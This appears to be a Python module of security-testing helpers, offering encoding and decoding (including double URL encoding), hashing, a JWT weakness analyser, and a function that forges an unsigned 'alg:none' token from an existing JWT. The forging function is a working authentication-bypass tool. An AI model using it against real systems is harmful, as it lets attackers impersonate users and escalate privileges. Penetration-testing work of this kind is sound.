"""Enhanced encoding, hashing, and JWT analysis tools."""
import base64
import urllib.parse
import hashlib
import html
import binascii
import jwt
from typing import Dict, Any, List


def encode_decode(text: str, format: str, operation: str = "encode") -> str:
    """Encode or decode text. Formats: base64, url, html, hex, unicode, double_url."""
    fmt = format.lower()
    op = operation.lower()
    try:
        if fmt == "base64":
            return base64.b64encode(text.encode()).decode() if op == "encode" else base64.b64decode(text.encode()).decode()
        elif fmt == "url":
            return urllib.parse.quote(text) if op == "encode" else urllib.parse.unquote(text)
        elif fmt == "double_url":
            return urllib.parse.quote(urllib.parse.quote(text)) if op == "encode" else urllib.parse.unquote(urllib.parse.unquote(text))
        elif fmt == "html":
            return html.escape(text) if op == "encode" else html.unescape(text)
        elif fmt == "hex":
            return binascii.hexlify(text.encode()).decode() if op == "encode" else binascii.unhexlify(text).decode()
        elif fmt == "unicode":
            if op == "encode":
                return "".join(f"\\u{ord(c):04x}" for c in text)
            else:
                return text.encode().decode("unicode_escape")
        else:
            return f"Unsupported format: {format}. Supported: base64, url, double_url, html, hex, unicode"
    except Exception as e:
        return f"Error during {operation} ({format}): {str(e)}"


def hash_text(text: str, algorithm: str = "sha256") -> str:
    """Hash text. Algorithms: md5, sha1, sha256, sha512."""
    algo = algorithm.lower()
    algos = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha256": hashlib.sha256, "sha512": hashlib.sha512}
    if algo in algos:
        return algos[algo](text.encode()).hexdigest()
    return f"Unsupported algorithm: {algorithm}. Supported: {', '.join(algos.keys())}"


def analyze_jwt(token: str) -> Dict[str, Any]:
    """Decode and analyze a JWT token. Checks for common weaknesses."""
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})

        weaknesses = []
        alg = header.get("alg", "")

        # Check for 'none' algorithm
        if alg.lower() == "none":
            weaknesses.append("CRITICAL: Algorithm is 'none' — signature not verified!")

        # Check for weak algorithms
        if alg in ("HS256",):
            weaknesses.append("INFO: HS256 used — could be vulnerable to secret brute-force")

        # Check for missing expiration
        if "exp" not in payload:
            weaknesses.append("WARNING: No expiration (exp) claim — token never expires")

        # Check for missing issued-at
        if "iat" not in payload:
            weaknesses.append("INFO: No issued-at (iat) claim")

        # Check for admin/role claims
        for key in ("admin", "role", "is_admin", "isAdmin", "permissions"):
            if key in payload:
                weaknesses.append(f"INTERESTING: '{key}' claim found with value: {payload[key]}")

        # Check kid (key ID) for injection
        if "kid" in header:
            weaknesses.append(f"INFO: 'kid' header present: {header['kid']} — potential injection point")

        # Check jku/x5u for SSRF
        for dangerous_header in ("jku", "x5u"):
            if dangerous_header in header:
                weaknesses.append(f"WARNING: '{dangerous_header}' header present — potential SSRF: {header[dangerous_header]}")

        return {
            "header": header,
            "payload": payload,
            "algorithm": alg,
            "weaknesses": weaknesses,
            "weakness_count": len(weaknesses),
        }
    except Exception as e:
        return {"error": f"Invalid JWT: {str(e)}"}


def generate_jwt_none_bypass(token: str) -> str:
    """Generate a JWT token with 'none' algorithm (alg:none attack).
    
    Takes an existing JWT, modifies the algorithm to 'none', and removes the signature.
    """
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})

        # Create token with none algorithm
        header["alg"] = "none"
        header_b64 = base64.urlsafe_b64encode(
            __import__("json").dumps(header, separators=(",", ":")).encode()
        ).decode().rstrip("=")
        payload_b64 = base64.urlsafe_b64encode(
            __import__("json").dumps(payload, separators=(",", ":")).encode()
        ).decode().rstrip("=")

        return f"{header_b64}.{payload_b64}."
    except Exception as e:
        return f"Error: {str(e)}"
